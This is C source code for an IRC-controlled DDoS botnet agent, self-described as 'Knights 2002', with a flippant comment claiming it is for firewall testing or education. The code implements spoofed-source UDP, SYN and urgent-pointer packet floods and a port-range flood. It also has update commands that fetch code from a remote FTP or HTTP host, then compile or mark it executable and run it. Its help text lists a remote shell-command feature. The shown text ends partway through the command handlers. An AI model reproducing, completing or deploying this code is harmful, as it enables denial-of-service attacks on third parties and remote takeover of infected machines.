/*
 * This code is a very good DDoS program.  Its used to test firewalls or some shit
 * like that.  Yea, that sounds good.  And for education purposes.  So its not my
 * fault if you do some other naughty shit with this code.
 *
 * This program goes on IRC and waits in a channel accepting your commands.
 * 
 * Edit those #defines down there cause you probably dont wanna use my default
 * info.  When it gets on IRC, you can send it the HELP command, prefixed with
 * the CONTROL_CHAR (which by default is @).  So it would be something like
 * @HELP.  Then it will send back info on all the exploits this knight has.
 * 
 * BTW: I dont use comments, sorry.
 * 
 * -bysin
 */
 
// This is the channel name
#define CHAN "#@stuff@"
// This is the key for the channel
#define KEY "blah"
// This is the port of the irc servers
#define PORT 6667
// This is the timeout to wait
#define TIMEOUT 30
// This is the character used to control the net
#define CONTROL_CHAR '@'

// This is the number of servers in the list
int numservers=12;
// This is the list of servers
char *servers[] = {
	"irc.emory.edu",
	"irc.ins.net.uk",
	"irc.lightning.net",
	"irc.gigabell.de",
	"irc.mcs.net",
	"irc.freebsd.org",
	"irc.east.gblx.net",
	"irc.west.gblx.net",
	"irc.plur.net",
	"irc.light.se",
	"irc.du.se",
	"irc.stanford.edu",
	(void*)0
};

////////////////////////////////////////////////////////////////
//                      Dont edit these                       //
////////////////////////////////////////////////////////////////

#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <strings.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <sys/wait.h>

int *pids, csum=0, actualparent;
char *nick, disabled=0, execfile[256];
unsigned long spoofs=0, spoofsm=0, numpids=0;
int mfork() {
	int parent;
	if (disabled == 1) return disabled;
	parent=fork();
	if (parent <= 0) return parent;
	numpids++;
	pids=(int*)realloc(pids,numpids);
	pids[numpids-1]=parent;
	return parent;
}
unsigned long getspoof() {
	if (!spoofs) return rand();
	if (spoofsm == 1) return ntohl(spoofs);
	return ntohl(spoofs+(rand() % spoofsm)+1);
}
void filter(char *a) {
	while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0;
}
long pow(long a, long b) {
	if (b == 0) return 1;
	if (b == 1) return a;
	return a*pow(a,b-1);
}
u_short in_cksum(u_short *addr, int len) { 
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer =0;
	if (!csum) return rand();
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}
	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w;
		sum += answer;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return(answer);
}
int Send(int sock, char *words, ...) {
	static char textBuffer[1024];
	va_list args;
	va_start(args, words);
	vsprintf(textBuffer, words, args);
	va_end(args);
	return write(sock,textBuffer,strlen(textBuffer));
}
void checksum(int sock, char *sender, int argc, char **argv) {
	if (argc != 1) {
		Send(sock,"NOTICE %s :CHECKSUM <on/off>\n",sender);
		return;
	}
	if (!strcmp(argv[1],"on")) {
		Send(sock,"NOTICE %s :Checksum has been turned on.\n",sender);
		csum=1;
	}
	else {
		Send(sock,"NOTICE %s :Checksum has been turned off.\n",sender);
		csum=0;
	}
}
void dns(int sock, char *sender, int argc, char **argv) {
	struct hostent *hostm;
	struct in_addr m;
	if (mfork() != 0) return;
	if (argc != 1) {
		Send(sock,"NOTICE %s :DNS <host>\n",sender);
		exit(0);
	}
	Send(sock,"NOTICE %s :Resolving %s...\n",sender,argv[1]);
	if ((hostm=gethostbyname(argv[1])) == NULL) {
		Send(sock,"NOTICE %s :Unable to resolve.\n",sender);
		exit(0);
	}
	memcpy((char*)&m, hostm->h_addr, hostm->h_length);
	Send(sock,"NOTICE %s :Resolved to %s.\n",sender,inet_ntoa(m));
	exit(0);
}
void getspoofs(int sock, char *sender, int argc, char **argv) {
	unsigned long a=spoofs;
	unsigned long b=(spoofsm+spoofs)-1;
	if (spoofsm == 1) Send(sock,"NOTICE %s :%d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0]);
	else Send(sock,"NOTICE %s :%d.%d.%d.%d - %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0],((u_char*)&b)[3],((u_char*)&b)[2],((u_char*)&b)[1],((u_char*)&b)[0]);
}
void version(int sock, char *sender, int argc, char **argv) {
	Send(sock,"NOTICE %s :Knights 2002\n",sender);
}
void nickc(int sock, char *sender, int argc, char **argv) {
	if (argc != 1) {
		Send(sock,"NOTICE %s :NICK <nick>\n",sender);
		return;
	}
	if (strlen(argv[1]) > 10) {
		Send(sock,"NOTICE %s :Nick cannot be larger than 10 characters.\n",sender);
		return;
	}
	nick=strdup(argv[1]);
	Send(sock,"NICK %s\n",nick);
}
void disable(int sock, char *sender, int argc, char **argv) {
	disabled=1;
}
void enable(int sock, char *sender, int argc, char **argv) {
	disabled=0;
}
void spoof(int sock, char *sender, int argc, char **argv) {
	char ip[256];
	int i, num;
	unsigned long uip;
	if (argc != 1) {
		Send(sock,"NOTICE %s :Removed all spoofs\n",sender);
		spoofs=0;
		spoofsm=0;
		return;
	}
	if (strlen(argv[1]) > 16) {
		Send(sock,"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\n",sender);
		return;
	}
	strcpy(ip,argv[1]);
	if (ip[strlen(ip)-1] == '.') ip[strlen(ip)-1] = 0;
	for (i=0, num=1;i<strlen(ip);i++) if (ip[i] == '.') num++;
	num=-(num-4);
	for (i=0;i<num;i++) strcat(ip,".0");
	uip=inet_network(ip);
	if (num == 0) spoofsm=1;
	else spoofsm=pow(256,num);
	spoofs=uip;
}
struct iphdr {
    unsigned int ihl:4;
    unsigned int version:4;
    unsigned char tos;
    unsigned int tot_len;
    unsigned int id;
    unsigned int frag_off;
    unsigned char ttl;
	unsigned char protocol;
    unsigned int check;
    unsigned long saddr;
    unsigned long daddr;
};
struct ip {
    unsigned int ip_hl:4;
    unsigned int ip_v:4;
    unsigned char ip_tos;
    unsigned short ip_len;
    unsigned short ip_id;
    unsigned short ip_off;
    unsigned char ip_ttl;
    unsigned char ip_p;
    unsigned short ip_sum;
    struct in_addr ip_src, ip_dst;
};
struct udphdr_ {
	unsigned short source;
	unsigned short dest;
	unsigned short len;
	unsigned short check;
};
void bysin(int sock, char *sender, int argc, char **argv) {
	unsigned int secs,port,i=0;
	unsigned long psize,target;
	struct sockaddr_in s_in;
	struct packet {
		struct ip ip;
		struct udphdr_ udp;
		char *buf;
	} packet;
	int get;
	time_t start=time(NULL);
	if (mfork() != 0) return;
	if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
	if (argc < 3) {
		Send(sock,"NOTICE %s :BYSIN <target> <port> <secs>\n",sender);
		exit(1);
	}
	target = inet_addr(argv[1]);
	port = atoi(argv[2]);
	secs = atoi(argv[3]);
	psize = 1500-(sizeof(struct ip)+sizeof(struct udphdr_));
	packet.buf=(unsigned char*)malloc(psize);
	memset(packet.buf,10,psize);
	Send(sock,"NOTICE %s :Packeting %s.\n",sender,argv[1]);
	packet.ip.ip_hl = 5;
	packet.ip.ip_v = 4;
	packet.ip.ip_tos = 0;
	packet.ip.ip_len = 1500;
	packet.ip.ip_off = 0;
	packet.ip.ip_p = 17;
	packet.ip.ip_ttl = 64;
	packet.ip.ip_dst.s_addr = target;
	packet.udp.len = htons(psize);
	s_in.sin_family  = AF_INET;
	s_in.sin_addr.s_addr = target;
	for (;;) {
		packet.udp.source = rand();
		if (port) packet.udp.dest = htons(port);
		else packet.udp.dest = rand();
		packet.udp.check = in_cksum((u_short *)&packet,1500);
		packet.ip.ip_src.s_addr = getspoof();
		packet.ip.ip_id = rand();
		packet.ip.ip_sum = in_cksum((u_short *)&packet,1500);
		s_in.sin_port = packet.udp.dest;
		sendto(get,(char*)&packet,1500,0,(struct sockaddr *)&s_in,sizeof(s_in));
		if (i >= 50) {
			if (time(NULL) >= start+secs) exit(0);
			i=0;
		}
		i++;
	}
}
struct tcphdr_ {
    unsigned int th_sport;
    unsigned int th_dport;
    unsigned int th_seq;
    unsigned int th_ack;
    unsigned char th_x2:4;
    unsigned char th_off:4;
    unsigned char th_flags;
    unsigned int th_win;
    unsigned int th_sum;
    unsigned int th_urp;
};
#define PACKETSIZE  (sizeof(struct ip) + sizeof(struct tcphdr_))
struct ip *ip;
struct tcphdr_ *tcp_;
struct sockaddr_in s_in;
unsigned char packet[PACKETSIZE];
int get;
unsigned long target;
unsigned long getaddr(char *hostname) {
	struct hostent *hp;
	if ((hp = gethostbyname(hostname)) == NULL) exit(1);
	return *(u_long *)hp->h_addr;
}
void makepacket(void) {
	memset(packet, 0 , PACKETSIZE);
	ip = (struct ip *)packet;
	tcp_ = (struct tcphdr_ *) (packet+sizeof(struct ip));
	ip->ip_hl = 5;
	ip->ip_v = 4;
	ip->ip_tos = 0;
	ip->ip_len = htons(PACKETSIZE);
	ip->ip_off = 0;
	ip->ip_ttl = 40;
	ip->ip_p = IPPROTO_TCP;
	ip->ip_dst.s_addr = target;
	tcp_->th_flags = 0x02;
	tcp_->th_win = htons(65535);
	s_in.sin_family  = AF_INET;
	s_in.sin_addr.s_addr = target;
}
void killm(u_int dstport) {
	ip->ip_src.s_addr = getspoof();
	ip->ip_id = random();
	tcp_->th_sport = random();
	tcp_->th_dport = htons(dstport);
	tcp_->th_seq = random();
	tcp_->th_ack = random();
	tcp_->th_sum = in_cksum((u_short *)tcp_, sizeof(struct tcphdr_));
	ip->ip_sum = in_cksum((u_short *)packet, PACKETSIZE);
	s_in.sin_port = htons(dstport);
	sendto(get,packet,PACKETSIZE,0,(struct sockaddr *)&s_in,sizeof(s_in));
}
void slice2(int sock, char *sender, int argc, char **argv) {
	int low,high,port,i=0;
	unsigned int secs;
	time_t start=time(NULL);
	if (mfork() != 0) return;
	if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
	if (argc < 4) {
		Send(sock,"NOTICE %s :SLICE2 <destination> <lowport> <highport> <secs>\n",sender);
		exit(1);
	}
	Send(sock,"NOTICE %s :Packeting %s.\n",sender,argv[1]);
	target = getaddr(argv[1]);
	low = atoi(argv[2]);
	high = atoi(argv[3]);
	secs = atoi(argv[4]);
	if (low > high) {
		Send(sock,"NOTICE %s :Error in SLICE2: Low > high.\n",sender);
		exit(1);
	}
 	if (low==high) {
		makepacket();
		for (;;) {
			killm(low);
			if (i >= 50) {
				if (time(NULL) >= start+secs) exit(0);
				i=0;
			}
			i++;
		}
	}
	makepacket();
	for (;;) {
		for(port = low;  port <=high; port++) {
			killm(port);
			if (i >= 50) {
				if (time(NULL) >= start+secs) exit(0);
				i=0;
			}
			i++;
		}
	}
	exit(0);
}
struct ttcphdr {
	unsigned short source;
	unsigned short dest;
	unsigned int seq;
	unsigned int ack_seq;
	unsigned short res1:4,
		doff:4,
		fin:1,
		syn:1,
		rst:1,
		psh:1,
		ack:1,
		urg:1,
		ece:1,
		cwr:1;
	unsigned short window;
	unsigned short check;
	unsigned short urg_ptr;
};
struct iiphdr {
	unsigned char ihl:4, version:4;
	unsigned char tos;
	unsigned short tot_len;
	unsigned short id;
	unsigned short frag_off;
	unsigned char ttl;
	unsigned char protocol;
	unsigned short check;
	unsigned int saddr;
	unsigned int daddr;
};
unsigned short in_cksum2(unsigned short *ptr, int nbytes) {
	register long sum=0;
	u_short	oddbyte=0;
	while (nbytes > 1)  {
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1) {
		*((u_char *) &oddbyte) = *(u_char *)ptr;
		sum += oddbyte;
	}
	sum  = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);	
	return (u_short)(~sum);
}
unsigned int host2ip(char *hostname) {
	static struct in_addr i;
	struct hostent *h;
	if((i.s_addr = inet_addr(hostname)) == -1) {
		if((h = gethostbyname(hostname)) == NULL) {
			fprintf(stderr, "cant find %s!\n", hostname);
			exit(0);
		}
		bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
	}
	return i.s_addr;
}
void pan(int sock, char *sender, int argc, char **argv) {
	struct send_tcp {
		struct iiphdr ip;
		struct ttcphdr tcp;
		char buf[20];
	} send_tcp;
	struct pseudo_header {
		unsigned int source_address;
		unsigned int dest_address;
		unsigned char placeholder;
		unsigned char protocol;
		unsigned short tcp_length;
		struct ttcphdr tcp;
		char buf[20];
	} pseudo_header;
	struct sockaddr_in sin;
	unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
	unsigned int psize=20, source, dest, check;
	unsigned long saddr, daddr,secs;
	int get;
	time_t start=time(NULL);
	if (mfork() != 0) return;
	if (argc < 2) {
		Send(sock,"NOTICE %s :PAN <target> <secs>\n",sender);
		exit(1);
	}
	if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
	{int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
	daddr=host2ip(argv[1]);
	secs=atol(argv[2]);
	Send(sock,"NOTICE %s :Panning %s.\n",sender,argv[1]);
	send_tcp.ip.ihl = 5;
	send_tcp.ip.version = 4;
	send_tcp.ip.tos = 16;
	send_tcp.ip.frag_off = 64;
	send_tcp.ip.ttl = 64;
	send_tcp.ip.protocol = 6;
	send_tcp.tcp.ack_seq = 0;
	send_tcp.tcp.doff = 10;
	send_tcp.tcp.res1 = 0;
	send_tcp.tcp.cwr = 0;
	send_tcp.tcp.ece = 0;
	send_tcp.tcp.urg = 0;
	send_tcp.tcp.ack = 0;
	send_tcp.tcp.psh = 0;
	send_tcp.tcp.rst = 0;
	send_tcp.tcp.fin = 0;
	send_tcp.tcp.syn = 1;
	send_tcp.tcp.window = 30845;
	send_tcp.tcp.urg_ptr = 0;
	while(1) {
		source=rand();
		dest=rand();
		saddr=getspoof();
		send_tcp.ip.tot_len = htons(40+psize);
		send_tcp.ip.id = rand();
		send_tcp.ip.saddr = saddr;
		send_tcp.ip.daddr = daddr;
		send_tcp.ip.check = 0;
		send_tcp.tcp.source = source;
		send_tcp.tcp.dest = dest;
		send_tcp.tcp.seq = rand();
		send_tcp.tcp.check = 0;
		sin.sin_family = AF_INET;
		sin.sin_port = source;
		sin.sin_addr.s_addr = send_tcp.ip.daddr;   
		send_tcp.ip.check = in_cksum2((unsigned short *)&send_tcp.ip, 20);
		check = rand();
		send_tcp.buf[9]=((char*)&check)[0];
		send_tcp.buf[10]=((char*)&check)[1];
		send_tcp.buf[11]=((char*)&check)[2];
		send_tcp.buf[12]=((char*)&check)[3];
		pseudo_header.source_address = send_tcp.ip.saddr;
		pseudo_header.dest_address = send_tcp.ip.daddr;
		pseudo_header.placeholder = 0;
		pseudo_header.protocol = IPPROTO_TCP;
		pseudo_header.tcp_length = htons(20+psize);
		bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
		bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
		send_tcp.tcp.check = in_cksum2((unsigned short *)&pseudo_header, 32+psize);
		sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
		if (a >= 50) {
			if (time(NULL) >= start+secs) exit(0);
			a=0;
		}
		a++;
	}
	close(get);
	exit(0);
}
void majin(int sock, char *sender, int argc, char **argv) {
	struct send_tcp {
		struct iiphdr ip;
		struct ttcphdr tcp;
		char buf[1440];
	} send_tcp;
	struct pseudo_header {
		unsigned int source_address;
		unsigned int dest_address;
		unsigned char placeholder;
		unsigned char protocol;
		unsigned short tcp_length;
		struct ttcphdr tcp;
		char buf[1440];
	} pseudo_header;
	struct sockaddr_in sin;
	unsigned int psize=1440, source, dest, a=0;
	unsigned long saddr, daddr, secs;
	int get;
	time_t start=time(NULL);
	if (mfork() != 0) return;
	if (argc < 2) {
		Send(sock,"NOTICE %s :MAJIN <target> <secs>\n",sender);
		exit(1);
	}
	if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
	{int i; for(i=0;i<psize;i++) send_tcp.buf[i]=(u_char)rand();}
	daddr=host2ip(argv[1]);
	secs=atol(argv[2]);
	Send(sock,"NOTICE %s :Majin'n %s.\n",sender,argv[1]);
	send_tcp.ip.ihl = 5;
	send_tcp.ip.version = 4;
	send_tcp.ip.ttl = 64;
	send_tcp.ip.protocol = 6;
	send_tcp.tcp.doff = 10;
	send_tcp.tcp.res1 = 0;
	send_tcp.tcp.cwr = 0;
	send_tcp.tcp.ece = 0;
	send_tcp.tcp.urg = 1;
	send_tcp.tcp.ack = 1;
	send_tcp.tcp.psh = 1;
	send_tcp.tcp.rst = 0;
	send_tcp.tcp.fin = 0;
	send_tcp.tcp.syn = 0;
	send_tcp.tcp.window = 30845;
	while(1) {
		source=rand();
		dest=rand();
		saddr=getspoof();
		send_tcp.ip.tot_len = htons(40+psize);
		send_tcp.ip.tos = rand()%2?16:0;
		send_tcp.ip.frag_off = rand();
		send_tcp.ip.id = rand();
		send_tcp.ip.saddr = saddr;
		send_tcp.ip.daddr = daddr;
		send_tcp.ip.check = 0;
		send_tcp.tcp.source = source;
		send_tcp.tcp.dest = dest;
		send_tcp.tcp.seq = rand();
		send_tcp.tcp.ack_seq = rand();
		send_tcp.tcp.check = 0;
		send_tcp.tcp.urg_ptr = rand();
		sin.sin_family = AF_INET;
		sin.sin_port = source;
		sin.sin_addr.s_addr = send_tcp.ip.daddr;   
		send_tcp.ip.check = in_cksum2((unsigned short *)&send_tcp.ip, 20);
		pseudo_header.source_address = send_tcp.ip.saddr;
		pseudo_header.dest_address = send_tcp.ip.daddr;
		pseudo_header.placeholder = 0;
		pseudo_header.protocol = IPPROTO_TCP;
		pseudo_header.tcp_length = htons(20+psize);
		bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
		bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
		send_tcp.tcp.check = in_cksum2((unsigned short *)&pseudo_header, 32+psize);
		sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
		if (a >= 50) {
			if (time(NULL) >= start+secs) exit(0);
			a=0;
		}
		a++;
	}
	close(get);
	exit(0);
}
void update(int sock, char *sender, int argc, char **argv) {
	int sock2,sock3,i,d;
	struct sockaddr_in server;
	unsigned long ipaddr;
	unsigned int dgcc, dport;
	char buf[1024], *pos, *port;
	FILE *gcc;
	int parent=getpid();
	if (mfork() != 0) return;
	if (argc < 5) {
		Send(sock,"NOTICE %s :UPDATE <host> <port> <username> <pass> <src:bin>\n",sender);
		exit(0);
	}
	if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		Send(sock,"NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).\n",sender);
		exit(0);
	}
	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(argv[2]));
	if ((ipaddr = inet_addr(argv[1])) == -1) {
		struct hostent *hostm;
		if ((hostm=gethostbyname(argv[1])) == NULL) {
			Send(sock,"NOTICE %s :Unable to resolve address.\n",sender);
			exit(0);
		}
		memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
	}
	else server.sin_addr.s_addr = ipaddr;
	memset(&(server.sin_zero), 0, 8);
	if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
		Send(sock,"NOTICE %s :Unable to connect to dump site.\n",sender);
		exit(0);
	}

	memset(buf,0,1024);
	recv(sock2,buf,1024,0);
	if (strncmp(buf,"220 ",4)) {
		Send(sock,"NOTICE %s :Error while logging in to dump: %s\n",sender,buf);
		exit(0);
	}
	Send(sock2,"USER %s\r\n",argv[3]);
	memset(buf,0,1024);
	recv(sock2,buf,1024,0);
	if (strncmp(buf,"331 ",4)) {
		Send(sock,"NOTICE %s :Error while logging in to dump: %s\n",sender,buf);
		exit(0);
	}
	Send(sock2,"PASS %s\r\n",argv[4]);
	memset(buf,0,1024);
	recv(sock2,buf,1024,0);
	if (strncmp(buf,"230 ",4)) {
		Send(sock,"NOTICE %s :Error while logging in to dump: %s\n",sender,buf);
		exit(0);
	}
	Send(sock2,"REST 0\r\n");
	memset(buf,0,1024);
	recv(sock2,buf,1024,0);

	gcc=popen("gcc --help","r");
	if (gcc != NULL) {
		memset(buf,0,1024);
		fgets(buf,1024,gcc);
		if (!strstr(buf,"Usage")) dgcc=0;
		else dgcc=1;
		pclose(gcc);
	} else dgcc=0;

	if (!dgcc) {
		Send(sock2,"TYPE I\r\n");
		memset(buf,0,1024);
		recv(sock2,buf,1024,0);
		if (strncmp(buf,"200 ",4)) {
			Send(sock,"NOTICE %s :GCC not found and cannot create passive binary mode: %s\n",sender,buf);
			exit(0);
		}
	}
	
	Send(sock2,"PASV\r\n");
	memset(buf,0,1024);
	recv(sock2,buf,1024,0);
	if (strncmp(buf,"227 ",4)) {
		Send(sock,"NOTICE %s :Error while starting passive to dump: %s\n",sender,buf);
		exit(0);
	}
	for (i=0;i<strlen(buf) && buf[i] != '(';i++);
	pos=buf+i+1;
	filter(pos);
	if (pos[strlen(pos)-1] == ')') pos[strlen(pos)-1]=0;
	for (i=0;i<strlen(pos);i++) if (pos[i] == ',') pos[i]='.';
	for (d=0,i=0;i<strlen(pos);i++) {
		if (pos[i] == '.') d++;
		if (d == 4) {
			pos[i]=0;
			port=pos+i+1;
			break;
		}
	}
	for (i=0;i<strlen(port) && port[i] != '.';i++);
	port[i]=0;
	dport=(atoi(port) * 256)+atoi(port+i+1);

	for (i=0;i<strlen(argv[5]) && argv[5][i] != ':';i++);
	argv[5][i]=0;
	if (dgcc) Send(sock2,"RETR %s\r\n",argv[5]);
	else Send(sock2,"RETR %s\r\n",argv[5]+i+1);

	if ((sock3 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		Send(sock,"NOTICE %s :Unable to create socket.\n",sender);
		exit(0);
	}
	server.sin_family = AF_INET;
	server.sin_port = htons(dport);
	server.sin_addr.s_addr = inet_addr(pos);
	memset(&(server.sin_zero), 0, 8);
	if (connect(sock3,(struct sockaddr *)&server, sizeof(server)) != 0) {
		Send(sock,"NOTICE %s :Unable to connect to streamed dump site.\n",sender);
		exit(0);
	}
	Send(sock,"NOTICE %s :Receiving update.\n",sender);
	system("mkdir /tmp");
	if (dgcc) {
		FILE *file=fopen("/tmp/.c","wb");
		char bufm[4096];
		while(1) {
			int i;
			if ((i=recv(sock3,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) fputc(bufm[d],file);
		}
		fclose(file);
		memset(buf,0,4096);
		sprintf(buf,"(gcc -o %s /tmp/.c; rm -rf /tmp/.c; kill -9 %d; kill -9 %d; %s &) > /dev/null",execfile,actualparent,parent,execfile);
	}
	else {
		FILE *file=fopen("/tmp/.o","wb");
		unsigned char bufm[4096];
		while(1) {
			int i,d;
			if ((i=recv(sock3,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) fputc(bufm[d],file);
		}
		fclose(file);
		memset(buf,0,4096);
		sprintf(buf,"(mv /tmp/.o %s; chmod 755 %s; kill -9 %d; kill -9 %d; %s &) > /dev/null",execfile,execfile,actualparent,parent,execfile);
	}
	system(buf);
	close(sock);
	close(sock2);
	close(sock3);
	kill(9,0);
	exit(0);
}
void updatehttp(int sock, char *sender, int argc, char **argv) {
	int sock2,i,d;
	struct sockaddr_in server;
	unsigned long ipaddr;
	unsigned char dgcc;
	char buf[1024], *file;
	FILE *gcc;
	int parent=getpid();
	if (mfork() != 0) return;
	if (argc < 2) {
		Send(sock,"NOTICE %s :UPDATEHTTP <host> <src:bin>\n",sender);
		exit(0);
	}
	if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		Send(sock,"NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).\n",sender);
		exit(0);
	}
	server.sin_family = AF_INET;
	server.sin_port = htons(80);
	if ((ipaddr = inet_addr(argv[1])) == -1) {
		struct hostent *hostm;
		if ((hostm=gethostbyname(argv[1])) == NULL) {
			Send(sock,"NOTICE %s :Unable to resolve address.\n",sender);
			exit(0);
		}
		memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
	}
	else server.sin_addr.s_addr = ipaddr;
	memset(&(server.sin_zero), 0, 8);
	if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
		Send(sock,"NOTICE %s :Unable to connect to http.\n",sender);
		exit(0);
	}

	gcc=popen("gcc --help","r");
	if (gcc != NULL) {
		memset(buf,0,1024);
		fgets(buf,1024,gcc);
		if (!strstr(buf,"Usage")) dgcc=0;
		else dgcc=1;
		pclose(gcc);
	} else dgcc=0;

	for (i=0;i<strlen(argv[2]) && argv[2][i] != ':';i++);
	argv[2][i]=0;
	if (dgcc) file=argv[2];
	else file=argv[2]+i+1;
	
	Send(sock2,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",file,argv[1]);
	Send(sock,"NOTICE %s :Receiving update.\n",sender);
	system("mkdir /tmp");
	if (dgcc) {
		FILE *file=fopen("/tmp/.c","wb");
		char bufm[4096];
		while(1) {
			int i;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
				for (d+=4;d<i;d++) fputc(bufm[d],file);
				goto done;
			}
		}
		done:
		while(1) {
			int i;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) fputc(bufm[d],file);
		}
		fclose(file);
		memset(buf,0,4096);
		sprintf(buf,"(gcc -o %s /tmp/.c; rm -rf /tmp/.c; kill -9 %d; %s &) > /dev/null 2>&1",execfile,parent,execfile);
	}
	else {
		FILE *file=fopen("/tmp/.o","wb");
		unsigned char bufm[4096];
		while(1) {
			int i;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
				for (d+=4;d<i;d++) fputc(bufm[d],file);
				goto done2;
			}
		}
		done2:
		while(1) {
			int i,d;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) fputc(bufm[d],file);
		}
		fclose(file);
		memset(buf,0,4096);
		sprintf(buf,"(mv /tmp/.o %s; chmod 755 %s; kill -9 %d; %s &) > /dev/null",execfile,execfile,parent,execfile);
	}
	close(sock);
	close(sock2);
	system(buf);
	kill(9,0);
	exit(0);
}
void help(int sock, char *sender, int argc, char **argv) {
	if (mfork() != 0) return;
	Send(sock,"NOTICE %s :This knight accepts the following commands via ctcp (with a #):\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :NICK <nick>                                      = Changes the nick of the knight\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :GETSPOOF                                         = Gets the current spoofing\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :UPDATEHTTP <host> <src:bin>                      = Downloads a update from a http\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :UPDATE <host> <port> <username> <pass> <src:bin> = Downloads a update from a dump\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :PAN <target> <secs>                              = An advanced syn flooder that will kill most network drivers\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :MAJIN <target> <secs>                            = An urgent pointer flooder\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :UDP <target> <port> <secs>                       = A UDP flooder\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :SLICE2 <destination> <lowport> <highport> <secs> = Slice2!\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :SPOOFS <subnet>                                  = Changes spoofing to a subnet\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :DNS <host>                                       = DNSs a host\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :CHECKSUM <on/off>                                = Turns checksum on or off\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :IRC <command>                                    = Sends this command to the server\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :SH <command>                                     = Executes a command\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :KILLALL                                          = Kills all current packeting\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :KILL                                             = Kills the knight\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :DISABLE                                          = Disables all packeting from this knight\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :ENABLE                                           = Enables all packeting from this knight\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :VERSION                                          = Requests version of knight\n",sender);
	sleep(2);
	Send(sock,"NOTICE %s :HELP                                             = Displays this\n",sender);
	exit(0);
}
void killdis(int sock, char *sender, int argc, char **argv) {
	char buf[1024]={0};
	if (disabled == 1) return;
	sprintf(buf,"kill -9 %d;kill -9 0",actualparent);
	system(buf);
	exit(0);
}
void killall(int sock, char *sender, int argc, char **argv) {
	unsigned long i;
	for (i=0;i<numpids;i++) {
		if (pids[i] != 0 && pids[i] != getpid()) {
			Send(sock,"NOTICE %s :Killing pid %d.\n",sender,pids[i]);
			kill(pids[i],9);
		}
	}
}
